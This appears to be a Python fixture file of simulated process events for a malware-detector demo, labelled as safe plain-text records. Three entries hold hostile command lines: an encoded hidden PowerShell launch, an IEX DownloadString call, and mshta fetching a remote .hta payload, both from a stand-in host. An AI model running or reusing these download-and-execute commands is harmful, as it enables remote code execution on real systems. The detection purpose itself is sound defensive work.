"""Safe simulated process events for the demo.

These are plain text records fed to the detector. NOTHING is executed and no
malware is involved - they only mimic what the collector would report if such
a process existed. Use them to show the alert pipeline during your presentation.
"""

SIMULATED_EVENTS = [
    dict(pid=90001, name="powershell.exe", parent_name="winword.exe",
         cmdline="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
         cpu_percent=12.0, memory_mb=95.0, num_children=1, chain_depth=5),
    dict(pid=90002, name="powershell.exe", parent_name="excel.exe",
         cmdline="powershell.exe -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')",
         cpu_percent=7.5, memory_mb=88.0, num_children=0, chain_depth=4),
    dict(pid=90003, name="mshta.exe", parent_name="outlook.exe",
         cmdline="mshta.exe http://example.invalid/payload.hta",
         cpu_percent=3.0, memory_mb=40.0, num_children=1, chain_depth=4),
    dict(pid=90004, name="powershell.exe", parent_name="explorer.exe",
         cmdline="powershell.exe -NoProfile -Command Get-Process | Sort CPU",
         cpu_percent=2.0, memory_mb=70.0, num_children=0, chain_depth=3),
    dict(pid=90005, name="chrome.exe", parent_name="explorer.exe",
         cmdline="chrome.exe --type=renderer --lang=en-US",
         cpu_percent=9.0, memory_mb=310.0, num_children=2, chain_depth=3),
]
